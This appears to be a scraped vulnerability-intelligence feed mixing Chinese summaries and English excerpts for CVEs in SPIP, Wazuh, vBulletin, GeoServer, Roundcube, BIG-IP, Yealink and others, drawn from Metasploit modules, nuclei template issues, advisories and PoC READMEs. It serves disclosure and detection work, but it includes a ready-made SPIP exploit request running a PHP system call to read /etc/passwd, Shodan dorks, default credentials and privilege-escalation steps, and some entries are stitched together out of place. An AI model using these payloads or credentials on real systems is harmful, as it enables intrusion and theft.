entry.title: Remote for Mac 2025.6 Unauthenticated UDP Keyboard RCE
entry.content:
漏洞信息

漏洞名称： Remote for Mac 2025.6 Unauthenticated UDP Keyboard RCE

漏洞类型： 命令执行

漏洞等级： 高危

漏洞描述： 该模块利用了Remote for Mac 2025.6中的一个未认证的远程代码执行漏洞。当启用“允许未知设备”设置时，攻击者可以通过UDP数据包模拟键盘输入而无需认证。通过发送一系列按键，攻击者可以打开终端并执行任意shell命令，实现代码执行。测试环境包括macOS Mojave和Ventura。

产品名称： Remote for Mac

影响版本： 2025.6

来源： https://github.com/rapid7/metasploit-framework/blob/82c27249de137e90a5c4715564aae8940f55d81f/modules%2Fexploits%2Fosx%2Fmisc%2Fremote_for_mac_udp_rce.rb

类型： rapid7/metasploit-framework:github issues

POC详情

entry.title: Spring Data REST & Boot 任意代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Spring Data REST & Boot 任意代码执行漏洞

漏洞编号：

  • CVE： CVE-2017-8046

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： Spring Data REST < 2.6.9和3.0.1版本，以及Spring Boot < 1.5.9和2.0 M6版本中存在一个远程代码执行漏洞。攻击者可以通过发送恶意的PATCH请求，利用精心构造的JSON数据执行任意Java代码。

产品厂商： Spring

产品名称： Spring Data REST, Spring Boot

影响版本： Spring Data REST < 2.6.9, 3.0.1; Spring Boot < 1.5.9, 2.0 M6

搜索语法： http.title:”eureka”

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12202

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Description:

Spring Data REST < 2.6.9 and 3.0.1, Spring Boot < 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.

Severity: Critical
POC:
  • https://github.com/guanjivip/CVE-2017-8046
  • https://github.com/jsotiro/VulnerableSpringDataRest
  • https://github.com/cved-sources/cve-2017-8046
  • https://vulncheck.com/xdb/a2ab2493c69d
  • https://github.com/bkhablenko/CVE-2017-8046
  • https///github.com:bkhablenko/CVE-2017-8046.git
  • https://github.com/jkutner/spring-break-cve-2017-8046
  • https://vulncheck.com/xdb/cf4f8c3e40a7
  • https://github.com/FixYourFace/SpringBreakPoC
  • https///github.com:FixYourFace/SpringBreakPoC.git
  • https://github.com/m3ssap0/spring-break_cve-2017-8046
  • https://github.com/m3ssap0/SpringBreakVulnerableApp
  • https://github.com/sj/spring-data-rest-CVE-2017-8046
  • https://github.com/Soontao/CVE-2017-8046-DEMO

KEV: True

Shodan Query: http.title:"eureka"

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

entry.title: SPIP porte_plume插件任意代码执行漏洞
entry.content:
漏洞信息

漏洞名称： SPIP porte_plume插件任意代码执行漏洞

漏洞编号：

  • CVE： CVE-2024-7954

漏洞类型： 代码注入

漏洞等级： 严重

漏洞描述： SPIP的porte_plume插件在4.30-alpha2、4.2.13和4.1.16之前的版本中存在任意代码执行漏洞。远程且未经认证的攻击者可以通过发送特制的HTTP请求，以SPIP用户的身份执行任意PHP代码。

产品厂商： SPIP

产品名称： SPIP

影响版本： version < 4.30-alpha2, version <= 4.2.13, version <= 4.1.16

搜索语法： app=”SPIP”

来源： https://github.com/DennZFV/RCE-CVE-2025

类型： CVE-2025:github search

仓库文件

  • RCE_CVE-2024-7954-main
  • README.md

来源概述

Codded By DennZF

Description :

The porte_plume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 is vulnerable to an arbitrary code execution vulnerability. A remote and unauthenticated attacker can execute arbitrary PHP as the SPIP user by sending a crafted HTTP request. (CRITICAL)

Exploitasi :

POST /index.php?action=porte_plume_previsu HTTP/1.1

Host:
Content-Type: application/x-www-form-urlencoded

data=AA_[->URL<?php system('cat /etc/passwd'); ?>]_BB

Use This Tools :

Nuclei -l(target file) -t(Templates) CVE-2024-7954.yml

Shodan Dorking :

app="SPIP"

Reference :

https://github.com/DennZFV

entry.title: MCP SSE API 暴露检测
entry.content:
漏洞信息

漏洞名称： MCP SSE API 暴露检测

漏洞类型： 未授权访问

漏洞等级： 中危

漏洞描述： 检测通过SSE API暴露的Model Context Protocol (MCP)服务器。MCP服务器通常提供对AI工具、LLM系统或其他自动化基础设施的管理访问。暴露的MCP接口可能导致未经授权的访问、信息泄露和潜在的系统被攻陷。此模板检测SSE服务器事件流，并返回可用于POST JSON-RPC 2.0请求的消息端点。

产品名称： Model Context Protocol (MCP) servers

entry.title: vBulletin replaceAdTemplate Remote Code Execution
entry.content:
漏洞信息

漏洞名称： vBulletin replaceAdTemplate Remote Code Execution

漏洞编号：

  • CVE： 2025-48827, 2025-48828

漏洞类型： 命令执行

漏洞等级： 高危

漏洞描述： 该漏洞存在于vBulletin的AJAX API处理程序和模板渲染系统中，影响版本5.0.0至6.0.3。攻击者可以通过未认证的方式利用ajax/api/ad/replaceAdTemplate端点调用受保护的控制器方法，这是由于PHP的Reflection API与PHP 8.1+的变化结合使用不当导致的。具体来说，它针对vB_Api_Ad::replaceAdTemplate()方法注入一个包含vb:if条件的模板，该条件评估攻击者提供的PHP代码，使用”system”($POST[])构造。恶意模板随后通过第二个未认证的请求到ajax/render/ad执行。成功利用会导致以webserver用户身份执行任意命令，无需认证。该模块支持PHP、Linux和Windows的有效载荷。

产品厂商： vBulletin

产品名称： vBulletin

影响版本： 5.0.0 <= version <= 6.0.3

来源： https://github.com/rapid7/metasploit-framework/blob/33439fccb3ddd0a65b02841e5ab09f4a1100b169/modules%2Fexploits%2Fmulti%2Fhttp%2Fvbulletin_replace_ad_template_rce.rb

类型： rapid7/metasploit-framework:github issues

entry.title: BigAnt Office Messenger SQL注入漏洞
entry.content:
漏洞信息

漏洞名称： BigAnt Office Messenger SQL注入漏洞

漏洞编号：

  • CVE： CVE-2024-54761

漏洞类型： SQL注入

漏洞等级： 严重

漏洞描述： BigAnt Office Messenger 5.6.06中存在一个严重的SQL注入漏洞，允许未经身份验证的远程攻击者通过滥用MySQL的SELECT … INTO OUTFILE功能执行任意系统命令。攻击链有条件地将一个瞬时的PHP webshell写入磁盘，执行system('id')，并通过unlink()立即自毁。这不会留下可追踪的痕迹，且无需身份验证。利用此漏洞需要MySQL的FILE权限和可写的webroot目录，这在Windows上的默认或配置不当的部署中常见。此CVE模拟了一个完整的杀伤链，使攻击者能够在不到3个请求的时间内从未经身份验证的输入到精确的瞬时代码执行。威胁行为者可能会将此作为针对基于Windows的内部协作软件的初始立足点向量，这些软件具有提升的服务上下文。

产品厂商： BigAntSoft

产品名称： Office Messenger

影响版本： 5.6.06

搜索语法： http.html:”BigAnt Office Messenger”, body=”BigAnt Office”

来源： https://github.com/projectdiscovery/nuclei-templates/blob/9c4372196279263e8edb59539ab89e3943857b96/http%2Fcves%2F2025%2FCVE-2024-54761.yaml

类型： projectdiscovery/nuclei-templates:github issues

POC详情

entry.title: nuxt-api-party SSRF & Credentials Leak via Whitespace Bypass
entry.content:
漏洞信息

漏洞名称： nuxt-api-party SSRF & Credentials Leak via Whitespace Bypass

漏洞编号：

  • CVE： CVE-2023-49799

漏洞类型： 服务器端请求伪造

漏洞等级： 高危

漏洞描述： nuxt-api-party允许开发者代理请求到API而不向客户端暴露凭证。此漏洞允许攻击者使用前导空格更改请求的baseURL，可能导致凭证泄露或SSRF。漏洞影响包括：通过绕过URL验证泄露敏感API凭证；执行服务器端请求伪造(SSRF)攻击，可能访问内部服务或不应暴露的资源。修复建议包括更新nuxt-api-party至版本0.22.0或更高版本，并通过移除任何前导或尾随HTTP空格来净化输入。

产品厂商： johannschopplich

产品名称： nuxt-api-party

影响版本： version < 0.22.0

来源： https://github.com/projectdiscovery/nuclei-templates/blob/d0a08fbcbf2c850994d966ff7af67fe140dd7f54/http%2Fcves%2F2023%2FCVE-2023-49799.yaml

entry.title: BIG-IP 认证绕过漏洞
entry.content:
漏洞信息

漏洞名称： BIG-IP 认证绕过漏洞

漏洞编号：

  • CVE： CVE-2023-46747

漏洞类型： 权限绕过

漏洞等级： 高危

漏洞描述： CVE-2023-46747漏洞影响多个版本的BIG-IP，该漏洞的nuclei模板中存在一个无效的PATCH请求，导致401响应，破坏了所有后续请求，因为使用了无效的password2值，导致利用失败。通过测试，确认了正确的PATCH请求格式，并更新了模板。确认更新后的模板在BIG-IP版本16.1.2和17.1.0.3上有效。在版本16.1.2（及更早版本）中，账户创建时已有活动密码，PATCH请求完全不需要。此外，利用过程有些不稳定，建议在发送某些请求之间加入时间延迟。原始错误的PATCH模板在版本15.1.8、16.1.2、16.1.3.1和17.1.0.3上确认无效。

产品厂商： F5

产品名称： BIG-IP

影响版本： 16.1.2, 17.1.0.3

来源： https://github.com/projectdiscovery/nuclei-templates/issues/8590

类型： projectdiscovery/nuclei-templates:github issues

来源概述

I’ve been investigating CVE-2023-46747 on various versions of BIG-IP and found that the nuclei template for this vulnerability has an invalid PATCH request that fails with a 401 response, disrupting all subsequent requests due to the use of the resultant invalid value of password2 and causing the exploit to fail. Through my own testing, I’ve figured out what a correct PATCH request looks like, and in the template it should be:

Note the addition of several headers and the inclusion of “oldPassword” in the JSON. I’ve confirmed that the updated template works against BIG-IP versions 16.1.2 and 17.1.0.3. Note that in version 16.1.2 (and earlier versions) accounts are created with an active password and the PATCH request is not necessary at all.

Also note that, at least in my testing, exploitation is a little unstable. It helps to build in time delays between sending some of the requests. Without any delays, exploitation tends to fail in version 16.1.3.1 in particular, even with the updated PATCH request template.

The original, incorrect PATCH template has been confirmed NOT to work in versions 15.1.8, 16.1.2, 16.1.3.1, and in 17.1.0.3.

Nuclei Version:

3.0.3

Template file:

http/cves/2023/CVE-2023-46747.yaml

Command to reproduce:

./nuclei -u https://192.168.92.138 -t cves/2023/CVE-2023-46747.yaml -v -debug

entry.title: Nginx HSTS缺失漏洞
entry.content:
漏洞信息

漏洞名称： Nginx HSTS缺失漏洞

漏洞类型： 配置问题

漏洞等级： 高危

漏洞描述： 该漏洞因Nginx配置中未启用HSTS（Strict-Transport-Security）而导致，可能使网站面临降级攻击的风险。修复建议是在/etc/nginx/nginx.conf的server块中添加’add_header Strict-Transport-Security “max-age=31536000; includeSubDomains; preload”;’。

产品名称： Nginx

来源： https://github.com/projectdiscovery/nuclei-templates/blob/a3d61e4408282177dc1cc290480ba9ed604d239b/file%2Faudit%2Fnginx%2Ffile-nginx-hsts-missing.yaml

Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

entry.title: Wazuh 反序列化远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Wazuh 反序列化远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2025-24016

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： Wazuh是一个免费开源的威胁预防、检测和响应平台。从版本4.4.0开始到4.9.1之前，存在一个不安全的反序列化漏洞，允许在Wazuh服务器上执行远程代码。DistributedAPI参数被序列化为JSON并使用as_wazuh_object（位于framework/wazuh/core/cluster/common.py中）进行反序列化。如果攻击者能够在DAPI请求/响应中注入未经过滤的字典，他们可以伪造一个未处理的异常（__unhandled_exc__）来评估任意Python代码。任何具有API访问权限的人（被入侵的仪表板或集群中的Wazuh服务器）或在某些配置下甚至是被入侵的代理都可以触发此漏洞。版本4.9.1包含修复。

产品厂商： Wazuh

产品名称： Wazuh

影响版本： 4.4.0 <= version < 4.9.1

来源： https://github.com/B1ack4sh/Blackash-CVE-2025-24016

类型： CVE-2025:github search

仓库文件

  • README.md

来源概述

CVE-2025-24016 Wazuh Remote Code Execution (RCE) - PoC 🚨

Description:

Wazuh is a free and open source platform used for threat prevention, detection, and response. Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability allows for remote code execution on Wazuh servers. DistributedAPI parameters are a serialized as JSON and deserialized using as_wazuh_object (in framework/wazuh/core/cluster/common.py). If an attacker manages to inject an unsanitized dictionary in DAPI request/response, they can forge an unhandled exception (__unhandled_exc__) to evaluate arbitrary python code. The vulnerability can be triggered by anybody with API access (compromised dashboard or Wazuh servers in the cluster) or, in certain configurations, even by a compromised agent. Version 4.9.1 contains a fix.

Metrics:

CNA: GitHub, Inc. Base Score: 9.9 CRITICAL Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H

Proof of Concept:

To trigger this vulnerability using the server API, follow the steps below.

PoC Burp Suite Request:

  1. Burp Suite Request to Trigger the Vulnerability:
  1. Explanation of Request:
  • Authorization Header: This is the base64-encoded authorization (wazuh-wui:MyS3cr37P450r.*-).
  • Payload: The malicious payload contains the unsanitized exception __unhandled_exc__ which triggers the execution of arbitrary Python code (exit in this case).

Disclaimer ⚠️

For educational and research purposes only. Use only against systems you own or have permission to test.

entry.title: Wazuh Web Interface 版本检测漏洞
entry.content:
漏洞信息

漏洞名称： Wazuh Web Interface 版本检测漏洞

漏洞编号：

  • CVE： CVE-2024-57378

漏洞类型： 信息泄露

漏洞等级： 中危

漏洞描述： 该漏洞涉及Wazuh Web Interface的版本检测问题，通过特定的Nuclei HTTP模板可以检测目标URL（及其/app/login页面）是否为Wazuh web界面，提取wazuhVersion值，并确认页面可访问（200状态）且确实是Wazuh UI（通过标题和关键词匹配）。如果提取的版本为4.8.2，Nuclei会报告匹配。

产品厂商： Wazuh

产品名称： Wazuh Web Interface

影响版本： 4.8.2

来源： https://github.com/rxerium/CVE-2024-57378

类型： CVE-2024:github search

仓库文件

  • CVE-2024-57378.yaml
  • README.md

来源概述

CVE-2024-57378

How does this detection method work?

This Nuclei HTTP template checks a target URL (and its /app/login page) for the Wazuh web interface, extracts the wazuhVersion value with a regex, and confirms the page is accessible (200 status) and actually a Wazuh UI (via title and keyword match). If the extracted version is 4.8.2, Nuclei reports a match

How do I run this script?

  1. Download Nuclei from here
  2. Copy the template to your local system
  3. Run the following command: nuclei -u https://yourHost.com -t template.yaml

References

  • https://nvd.nist.gov/vuln/detail/CVE-2024-57378

Disclaimer

Use at your own risk, I will not be responsible for illegal activities you conduct on infrastructure you do not own or have permission to scan.

Contact

entry.title: [XBOW-025-068] XML External Entity (XXE) Processing Vulnerability in GeoServer WFS Service
entry.content:
链接： https://github.com/advisories/GHSA-jj54-8f66-c5pc

仓库 Star： 4052

CVSS 评分： 8.2

参考链接：

  • https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-2p76-gc46-5fvc

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-jj54-8f66-c5pc

  • https://github.com/geotools/geotools/security/advisories/GHSA-826p-4gcg-35vw

  • https://nvd.nist.gov/vuln/detail/CVE-2025-30220

  • https://github.com/geonetwork/core-geonetwork/pull/8757

  • https://github.com/geonetwork/core-geonetwork/pull/8803

  • https://github.com/geonetwork/core-geonetwork/pull/8812

  • https://docs.geoserver.org/latest/en/user/production/config.html#production-config-external-entities

  • https://github.com/advisories/GHSA-jj54-8f66-c5pc

描述：

Summary

GeoServer Web Feature Service (WFS) web service was found to be vulnerable to GeoTools CVE-2025-30220 XML External Entity (XXE) processing attack.

It is possible to trigger the parsing of external DTDs and entities, bypassing standard entity resolvers. This allows for Out-of-Band (OOB) data exfiltration of local files accessible by the GeoServer process, and Service Side Request Forgery (SSRF).

Details

While direct entity resolution is managed by application property ENTITY_RESOLUTION_ALLOWLIST for XML Parsing, this restriction was not being used by the GeoTools library when building an in-memory XSD Library Schema representation.

This bypasses GeoServer’s AllowListEntityResolver enabling XXE attacks.

PoC

No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS service.

Impact

  • Information Disclosure:

    This vulnerability allows unauthenticated attackers to read arbitrary files from the server’s filesystem that are accessible to the GeoServer process.

    This can lead to exposure of sensitive information including configuration files, credentials, and system files. The attack can be performed remotely without authentication, making it particularly severe.

  • Server-Side Request Forgery (SSRF)

    The mechanism inherently allows forcing GeoServer to make HTTP requests to arbitrary URLs, enabling SSRF attacks against internal network resources

References

  • CVE-2025-30220 XML External Entity (XXE) Processing Vulnerability in XSD schema handling
  • External Entities Resolution (GeoServer User Manual)

Acknowledgements

This vulnerability was initially reported via an automated tool described below. Subsequently a duplicate report via @YacineF, and their patience working with the GeoServer project, was instrumental finding in escalating this issue and determining a resolution.

XBOW-025-068 Disclaimer

This vulnerability was detected using XBOW, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission. While XBOW is intended to work autonomously, during its development human experts ensure the accuracy and relevance of its reports.

entry.title: GeoServer vulnerable to SSRF in TestWfsPost for specific targets, eg PHP + Nginx
entry.content:
链接： https://github.com/advisories/GHSA-68cf-j696-wvv9

仓库 Star： 4052

CVSS 评分： 7.5

参考链接：

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-5gw5-jccf-6hxw

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-68cf-j696-wvv9

  • https://github.com/advisories/GHSA-68cf-j696-wvv9

描述：

Summary

Missing checks allow for SSRF to specific targets using the TestWfsPost enpoint.

Mitigation

To manage the proxy base value as a system administrator, use the parameter PROXY_BASE_URL to provide a non-empty value that cannot be overridden by the user interface or incoming request.thomsmith.

Resolution

The TestWfsPost has been replaced in GeoServer 2.25.2 and GeoServer 2.24.4 with a JavaScript Demo Requests page to test OGC Web Services.

References

  • CVE-2024-29198 Unauthenticated SSRF via TestWfsPost

Affected Platforms: Cisco Identity Services Engine (ISE) cloud deployments on AWS, Microsoft Azure, and Oracle Cloud Infrastructure (OCI)

Vulnerability Description: A critical flaw in the credential generation and authorization logic causes multiple Cisco ISE cloud deployments to share identical credentials when using the same software release on the same cloud platform. This allows an unauthenticated remote attacker to extract valid credentials and escalate privileges across different deployments

entry.title: GeoServer Missing Authorization on REST API Index
entry.content:
链接： https://github.com/advisories/GHSA-h86g-x8mm-78m5

仓库 Star： 4052

CVSS 评分： 5.3

参考链接：

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-h86g-x8mm-78m5

  • https://nvd.nist.gov/vuln/detail/CVE-2025-27505

  • https://github.com/geoserver/geoserver/pull/8170

  • https://osgeo-org.atlassian.net/browse/GEOS-11664

  • https://osgeo-org.atlassian.net/browse/GEOS-11776

  • https://github.com/advisories/GHSA-h86g-x8mm-78m5

描述：

Summary

It is possible to bypass the default REST API security and access the index page.

Details

The REST API security handles rest and its subpaths but not rest with an extension (e.g., rest.html).

Impact

The REST API index can disclose whether certain extensions are installed.

Workaround

In ${GEOSERVER_DATA_DIR}/security/config.xml, change the paths for the rest filter to /rest.*,/rest/** and change the paths for the gwc filter to /gwc/rest.*,/gwc/rest/** and restart GeoServer.

References

https://osgeo-org.atlassian.net/browse/GEOS-11664
https://osgeo-org.atlassian.net/browse/GEOS-11776
https://github.com/geoserver/geoserver/pull/8170

漏洞编号：

  • CVE： CVE-2025-24016

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： Wazuh软件中存在反序列化漏洞，攻击者可以通过构造恶意数据实现远程代码执行。受影响版本为4.4.0至4.9.0。

产品厂商： Wazuh

产品名称： Wazuh

影响版本： 4.4.0 <= version <= 4.9.0

来源： https://github.com/rxerium/CVE-2025-24016

类型： CVE-2025:github search

仓库文件

  • CVE-2025-24016.yaml
  • README.md

来源概述

CVE-2025-24016

How does this detection method work?

This Nuclei HTTP template checks a target URL (and its /app/login page) for the Wazuh web interface, extracts the wazuhVersion value with a regex, and confirms the page is accessible (200 status) and actually a Wazuh UI (via title and keyword match). If the extracted version sits between 4.4.0 and 4.9.0 (the vulnerable range for CVE-2025-24016), Nuclei reports a critical finding, signalling that unsafe deserialisation could allow remote code execution.

How do I run this script?

  1. Download Nuclei from here
  2. Copy the template to your local system
  3. Run the following command: nuclei -u https://yourHost.com -t template.yaml

References

  • https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh
  • https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  • https://www.cve.org/CVERecord?id=CVE-2025-24016

Disclaimer

Use at your own risk, I will not be responsible for illegal activities you conduct on infrastructure you do not own or have permission to scan.

Contact

Feel free to reach out to me on Signal.

entry.title: WordPress RealHomes Theme 权限提升漏洞
entry.content:
漏洞信息

漏洞名称： WordPress RealHomes Theme 权限提升漏洞

漏洞编号：

  • CVE： CVE-2025-4601

漏洞类型： 权限提升

漏洞等级： 严重

漏洞描述： WordPress主题RealHomes版本<=4.4.0存在权限提升漏洞，允许低权限用户（如订阅者）通过inspiry_update_profile功能提升至管理员权限。攻击者可通过向admin-ajax.php端点发送特制的POST请求，设置realhomes_user_role参数为administrator来利用此漏洞。此漏洞需要ere_allow_users_change_role选项启用。成功利用后，攻击者可获得完全的管理员权限，可能导致网站被完全控制。

产品厂商： WordPress

产品名称： RealHomes

影响版本： <= 4.4.0

来源： https://github.com/Yucaerin/CVE-2025-4601

类型： CVE-2025:github search

仓库文件

  • README.md

来源概述

CVE-2025-4601 - WordPress RealHomes Theme <= 4.4.0 - Privilege Escalation

🔥 Vulnerability Summary
The WordPress theme RealHomes versions <= 4.4.0 is vulnerable to a privilege escalation vulnerability. This allows authenticated users with low privileges (such as subscribers) to escalate their roles to administrators. This vulnerability occurs through the inspiry_update_profile function, which improperly allows users to change their role if the ere_allow_users_change_role option is enabled.

This issue can be exploited by submitting a specially crafted POST request to the admin-ajax.php endpoint, providing the realhomes_user_role parameter set to administrator.

🔍 Affected Theme

  • Theme Name: RealHomes
  • Affected Version: <= 4.4.0
  • Vulnerability Type: Privilege Escalation
  • CVE ID: CVE-2025-4601
  • CVSS Score: 8.8 (Critical)
  • Impact: Full Administrative Access → Potential Site Compromise

🧪 Exploit Features

  • 📥 Fetches nonce automatically from the target page.
  • 🔐 Escalates user role to administrator via the realhomes_user_role parameter.
  • 🌐 No authentication required beyond being logged in as a low-privileged user (e.g., subscriber).
  • 💾 Updates user profile, granting administrative access to the attacker.

🧠 Researcher

  • Credit: Thai An

🚀 Usage

  1. Login to the target website as a low-privileged user (e.g., subscriber).

  2. Access the /wp-admin/admin-ajax.php endpoint with the following POST data, which includes the realhomes_user_role set to administrator:

  3. Check the response: If the request is successful, the attacker will gain administrative access.

  4. Verify by accessing the /wp-admin/ page to confirm if the attacker has been granted admin privileges.

🔒 Disclaimer:
This is intended for educational purposes only and should only be used on systems you own or are explicitly authorized to test. Misuse of this code may lead to legal consequences.

entry.title: GeoServer Vulnerable to Unauthenticated SSRF via TestWfsPost
entry.content:
链接： https://github.com/advisories/GHSA-5gw5-jccf-6hxw

仓库 Star： 4052

CVSS 评分： 7.5

参考链接：

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-5gw5-jccf-6hxw

  • https://nvd.nist.gov/vuln/detail/CVE-2021-40822

  • https://osgeo-org.atlassian.net/browse/GEOS-11390

  • https://osgeo-org.atlassian.net/browse/GEOS-11794

  • https://github.com/advisories/GHSA-5gw5-jccf-6hxw

描述：

Summary

It possible to achieve Service Side Request Forgery (SSRF) via the Demo request endpoint if Proxy Base URL has not been set.

Details

A unauthenticated user can supply a request that will be issued by the server. This can be used to enumerate internal networks and also in the case of cloud instances can be used to obtain sensitive data.

Mitigation

  1. When using GeoServer with a proxy, manage the proxy base value as a system administrator, use the application property PROXY_BASE_URL to provide a non-empty value that cannot be overridden by the user interface or incoming request.

  2. When using GeoServer directly without a proxy, block all access to TestWfsPost by editing the web.xml file. Adding this block right before the end:

Resolution

Upgrading to GeoServer 2.24.4, or 2.25.2, removes the TestWfsPost servlet resolving this issue.

The demo request page functionality is now implemented directly in the browser.

Reference

  • https://osgeo-org.atlassian.net/browse/GEOS-11794
  • https://osgeo-org.atlassian.net/browse/GEOS-11390
  • https://nvd.nist.gov/vuln/detail/CVE-2021-40822

entry.title: GeoServer has improper ENTITY_RESOLUTION_ALLOWLIST URI validation in XML Processing (SSRF)
entry.content:
链接： https://github.com/advisories/GHSA-mc43-4fqr-c965

仓库 Star： 4052

CVSS 评分： 9.3

参考链接：

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-mc43-4fqr-c965

  • https://docs.geoserver.org/latest/en/user/production/config.html#production-config-external-entities

  • https://github.com/advisories/GHSA-mc43-4fqr-c965

描述：

Summary

An improper URI validation vulnerability exists that enables an unauthorized attacker to perform XML External Entities (XEE) attack, then send GET request to any HTTP server. Attacker can abuse this to scan internal networks and gain information about them then exploit further. Moreover, attacker can read limited .xsd file on system.

Details

By default, GeoServer use PreventLocalEntityResolver class from GeoTools to filter out malicious URIs in XML entities before resolving them. The URI must match the regex (?i)(jar:file|http|vfs)[^?#;]*\\.xsd. But the regex leaves a chance for attackers to request to any HTTP server or limited file.

Impact

An unauthenticated attacker can:

  1. Scan internal network to gain insight about it and exploit further.
  2. SSRF to endpoint ends with .xsd.
  3. Read limited .xsd file on system.

Mitigation

  1. Define the system property ENTITY_RESOLUTION_ALLOWLIST to limit the supported external schema locaitons.
  2. The built-in allow list covers the locations required for the operation of OGC web services: www.w3.org,schemas.opengis.net,www.opengis.net,inspire.ec.europa.eu/schemas.
  3. The user guide provides details on how to add additional locations (this is required for app-schema plugin where a schema is supplied to define an output format).

Resolution

  1. GeoServer 2.25.0 and greater default to the use of ENTITY_RESOLUTION_ALLOWLIST and does not require you to provide a system property.
  2. The use of ENTITY_RESOLUTION_ALLOWLIST is still supported if you require additional schema locations to be supported beyond the built-in allow list.
  3. GeoServer 2.25.1 change ENTITY_RESOLUTION_ALLOWLIST no longer supports regular expressions

References

  • External Entities Resolution (GeoServer User Guide)

Credits

  • Le Mau Anh Phong from VNG Security Response Center & VNUHCM - University of Information Technology

entry.title: GWC Home Page communicate version and revision information
entry.content:
链接： https://github.com/advisories/GHSA-jm79-7xhw-6f6f

仓库 Star： 4052

CVSS 评分： 5.3

参考链接：

  • https://github.com/geoserver/geoserver/security/advisories/GHSA-jm79-7xhw-6f6f

  • https://github.com/GeoWebCache/geowebcache/issues/1344

  • https://github.com/GeoWebCache/geowebcache/pull/1345

  • https://github.com/geoserver/geoserver/pull/8189

  • https://osgeo-org.atlassian.net/browse/GEOS-11677

  • https://github.com/advisories/GHSA-jm79-7xhw-6f6f

描述：

Summary

The GeoWebCache home page includes version and revision information about the software in use. This information is sensitive from a security point of view because it allows software used by the server to be easily identified.

Details

org.geowebcache.GeoWebCacheDispatcher.handleFrontPage(HttpServletRequest, HttpServletResponse) has no check to hide potentially sensitive information from users except for a hidden system property to hide the storage locations that defaults to showing the locations.

PoC

Just open http://localhost:8080/geoserver/gwc/

Impact

In addition to exposing the version and revision information, the home page will expose the config file and storage locations which may expose the system’s temp directory location and whether or not GeoServer is running in a Windows operating system. The approximate server start time and some basic GWC usage information is also exposed.

References

https://osgeo-org.atlassian.net/browse/GEOS-11677
https://github.com/geoserver/geoserver/pull/8189
https://github.com/GeoWebCache/geowebcache/issues/1344
https://github.com/GeoWebCache/geowebcache/pull/1345

entry.title: Coverage REST API Server Side Request Forgery

Summary

The Coverage rest api /workspaces/{workspaceName}/coveragestores/{storeName}/{method}.{format} allow to upload file with a specified url (with {method} equals ‘url’) with no restrict.

Details

The Coverage rest api /workspaces/{workspaceName}/coveragestores/{storeName}/{method}.{format} allow to upload file with a specified url (with {method} equals ‘url’). But this url has not been check with URL Checks feature.

For example, should add the code below to check fileURL:

The vulnerable code was RESTUtils.java

Impact

This vulnerability presents the opportunity for Server Side Request Forgery.

entry.title: Roundcube Post-Auth RCE via PHP Object Deserialization
entry.content:
漏洞信息

漏洞名称： Roundcube Post-Auth RCE via PHP Object Deserialization

漏洞编号：

  • CVE： CVE-2025-49113

漏洞类型： 反序列化

漏洞等级： 高危

漏洞描述： Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program/actions/settings/upload.php中的_from参数未经验证，导致PHP对象反序列化漏洞，允许认证用户远程执行代码。攻击者可以以Web服务器权限执行任意系统命令。

产品厂商： Roundcube

产品名称： Roundcube Webmail

影响版本： version <= 1.5.10 and 1.6.x < 1.6.11

来源： https://github.com/rapid7/metasploit-framework/blob/d764237230ac45a0098bef49a88fb86bc6540fe3/modules%2Fexploits%2Fmulti%2Fhttp%2Froundcube_auth_rce_cve_2025_49113.rb

entry.title: Yealink 默认用户凭证漏洞
entry.content:
漏洞信息

漏洞名称： Yealink 默认用户凭证漏洞

漏洞类型： 弱口令

漏洞等级： 中危

漏洞描述： Yealink设备除了默认的admin:admin凭证外，大多数设备还预装了另一个默认用户，用户名为”user”，密码也为”user”。虽然这不是管理员账户，但仍可用于对设备进行更改。此漏洞可能导致未授权访问。

产品厂商： Yealink

产品名称： Yealink devices

搜索语法： title=”Yealink T53W”

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12287

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Except for admin:admin, most of the Yealink devices ship with another default user where the username and password is set to “user”. Although this is not an administrator, it can be still used to make changes in the device. I’ve created the following template that checks for this issue:

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

漏洞等级： 严重

